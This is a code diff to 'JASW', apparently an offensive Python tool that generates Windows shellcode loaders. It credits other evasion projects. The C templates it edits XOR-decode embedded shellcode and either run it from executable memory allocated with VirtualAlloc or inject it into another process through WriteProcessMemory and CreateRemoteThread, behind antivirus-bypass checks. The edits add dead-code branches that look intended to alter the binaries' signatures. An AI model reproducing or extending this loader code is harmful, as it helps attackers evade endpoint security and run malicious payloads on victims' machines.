@@ -20,7 +20,9 @@ def intro():
         ":thumbs_up:") + " Many thanks to https://github.com/9emin1/charlotte")
     print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(
         ":thumbs_up:") + " Many thanks to https://github.com/Arno0x/ShellcodeWrapper")
-    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(":thumbs_up:") + " All the guys everywhere")
+    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(
+        ":thumbs_up:") + " Many thanks to https://github.com/icyguider/Shhhloader")
+    print(emoji.emojize(":right_arrow:") + " " + emoji.emojize(":thumbs_up:") + " All the guys everywhere and my mommy")
     print()
     print(text2art("JASW", "efti_wall"))
 
@@ -523,6 +525,7 @@ class Windows(ShellCoder):
         self.selected_bypass = self.ask_for_bypass()
         self.gen_template()
         self.compile_payload()
+        print(" OK Done")
 
     def gen_shellcode(self):
         self.shellcode_path = "%s/shellcode.raw" % self.output_path
@@ -574,6 +577,7 @@ class Windows(ShellCoder):
             return self.xor_shellcode(bytearray(raw_shellcode.read()), x_key)
 
     def shellcode_process_hollowing(self, bypass_functions, bypass_calls, bypass_imports):
+        # TODO debug me
         xor_key = self.make_random_str()
         encoded_shellcode = self.open_shellcode(xor_key)
         return """#include <windows.h>
@@ -671,6 +675,13 @@ using namespace std;
 
 int main(int argc, char **argv) {{
 
+int res = -1;
+
+if (res == 0) {{
+    printf("We start now !!");
+}}
+
+
 if ({bypass_calls}) {{
     char {xor_var}[] = "{xor_key}";
     char {shellcode_var}[] = "{encoded_shellcode}";
@@ -688,6 +699,9 @@ if ({bypass_calls}) {{
     void *{v_alloc_var} = VirtualAlloc(0, sizeof {shellcode}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy({v_alloc_var}, {shellcode}, sizeof {shellcode});
     ((void(*)()){v_alloc_var})();
+ }} else {{
+    printf("in the second condition");
+    return 0;
  }}
 }}
         """.format(
@@ -777,6 +791,12 @@ DWORD {find_process_id}()
 }}
 
 int main(int argc, char **argv) {{
+    int res = -1;
+
+    if (res == 0) {{
+        printf("We start now !!");
+    }}
+
     if ({bypass_calls}) {{
         char {xor_var}[] = "{xor_key}";
         char {shellcode_var}[] = "{encoded_shellcode}";
@@ -800,7 +820,10 @@ int main(int argc, char **argv) {{
         WriteProcessMemory({process_handle}, {remote_buffer}, {shellcode}, sizeof {shellcode}, NULL);
         {remote_thread} = CreateRemoteThread({process_handle}, NULL, 0, (LPTHREAD_START_ROUTINE){remote_buffer}, NULL, 0, NULL);
         CloseHandle({process_handle});
+    }} else {{
+        printf("in the second condition");
     }}
+    
     return 0;
 }} 
         """.format(
@@ -973,14 +996,14 @@ if '__main__' == __name__:
     intro()
     print()
     win = Windows()
-   # cprint(" What kind of target is it?", "white", "on_blue")
-   # print()
-   # print(emoji.emojize(":right_arrow:") + " [1] Windows ")
-   # print(emoji.emojize(":right_arrow:") + " [2] Linux ")
-   # target = input(" ? ")
-   # if target == '1':
-   #     win = Windows()
-    # elif target == '2':
-    # Linux()
-    #else:
-     #   raise Exception("Unknown target")
+# cprint(" What kind of target is it?", "white", "on_blue")
+# print()
+# print(emoji.emojize(":right_arrow:") + " [1] Windows ")
+# print(emoji.emojize(":right_arrow:") + " [2] Linux ")
+# target = input(" ? ")
+# if target == '1':
+#     win = Windows()
+# elif target == '2':
+# Linux()
+# else:
+#   raise Exception("Unknown target")
